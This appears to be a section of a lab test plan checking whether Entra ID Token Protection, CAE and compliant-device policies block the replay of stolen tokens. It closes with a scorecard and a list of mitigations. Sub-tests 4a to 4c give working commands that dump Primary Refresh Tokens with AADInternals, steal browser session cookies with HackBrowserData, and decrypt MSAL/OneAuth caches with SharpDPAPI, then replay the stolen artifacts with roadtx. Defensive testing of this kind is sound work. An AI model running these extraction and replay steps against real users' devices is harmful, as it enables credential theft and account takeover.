# 04 - Endpoint Token Theft Test

## What this tests

Once an attacker has code execution as the logged-in user on a workstation, they can extract auth artifacts (PRT, browser cookies, MSAL token caches) and attempt to use them from another box. This is the test for whether Token Protection actually denies replay from a non-bound device.

For lab purposes, skip the malware delivery step — run extraction tools as the logged-in user directly. You're testing the post-execution control, not the EDR.

## Three sub-tests

### 4a — Primary Refresh Token theft

**Tool:** AADInternals (PowerShell) — actively maintained, dumps PRT + session key cleanly.

On victim Entra-joined box, as the logged-in user:
```powershell
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals

# Dumps PRT and session key via BrowserCore.exe COM interface
$prtKeys = Get-AADIntUserPRTKeys
$prtKeys | ConvertTo-Json | Out-File ".\prt-victim01.json"
```

Move `prt-victim01.json` to attacker box. Replay with **roadtx** (Python, part of ROADtools):
```bash
pip install roadtools roadtx
roadtx prtauth \
  --prt "$(jq -r .refresh_token prt-victim01.json)" \
  --prt-sessionkey "$(jq -r .session_key prt-victim01.json)" \
  -c 1b730954-1685-4b74-9bfd-dac224a7b894 \
  -r https://graph.microsoft.com
```

**Expected with Token Protection enforced on bound apps:** replay fails with `AADSTS50180` or similar (token not bound to current device).
**Expected without Token Protection:** replay succeeds → access token granted.

### 4b — Browser session cookie theft

**Tool:** HackBrowserData or SharpChromium (both publicly maintained). They handle DPAPI decryption.

```powershell
# HackBrowserData (Go, cross-platform)
.\hack-browser-data.exe -b edge -f json -dir ./loot
# Look for cookies with name ESTSAUTH / ESTSAUTHPERSISTENT, domain .login.microsoftonline.com
```

Move the cookie values to attacker box → import into Chrome via Cookie Editor extension → browse to `outlook.office.com`.

**Expected with Token Protection:** still succeeds — Token Protection does not cover browser sessions today.
**Expected with CAE strict location + replay from unallowed IP:** session dies within ~minutes.
**Expected with requireCompliantDevice CA:** session blocked (attacker box not compliant).

This sub-test specifically confirms the "browser session is the gap" finding from the methodology.

### 4c — MSAL / WAM token cache theft

Locations to enumerate on victim box:
- `%LOCALAPPDATA%\.IdentityService\` — MSAL extended cache
- `%LOCALAPPDATA%\Microsoft\TokenBroker\Cache\` — WAM broker
- `%LOCALAPPDATA%\Microsoft\OneAuth\` — OneAuth (Office)

These are DPAPI-bound to the user. **SharpDPAPI** decrypts them when run as the user:
```powershell
.\SharpDPAPI.exe oneauthcache /target:"$env:LOCALAPPDATA\Microsoft\OneAuth"
```

Extracted refresh tokens can be tested in roadtx or TokenTacticsV2 against the same target apps.

**Expected with Token Protection for bound apps (Outlook desktop, Teams desktop):** replay fails from attacker box.

## Scorecard for this section

| Sub-test | Token Protection enforced | CAE strict location on | Compliant device CA | Result |
|---|---|---|---|---|
| 4a PRT replay | __ | __ | __ | __ |
| 4b Browser cookie replay (web) | n/a | __ | __ | __ |
| 4c MSAL cache replay (native app) | __ | __ | __ | __ |

## Closing the gap

The defenses are layered:
- **Token Protection CA** for Exchange/SharePoint/Teams native clients on Windows — kills 4a and 4c for bound apps
- **CAE strict location** — kills all three replay scenarios if attacker IP is outside named locations
- **Compliant device CA** for all M365 cloud apps — kills all replay from unmanaged boxes (this is the single highest-impact control)
- **Credential Guard + tamper protection + EDR** on workstations to make the initial extraction harder
- **Risky sign-in CA policy** — Medium+ requires reauth, which catches anomalous replay
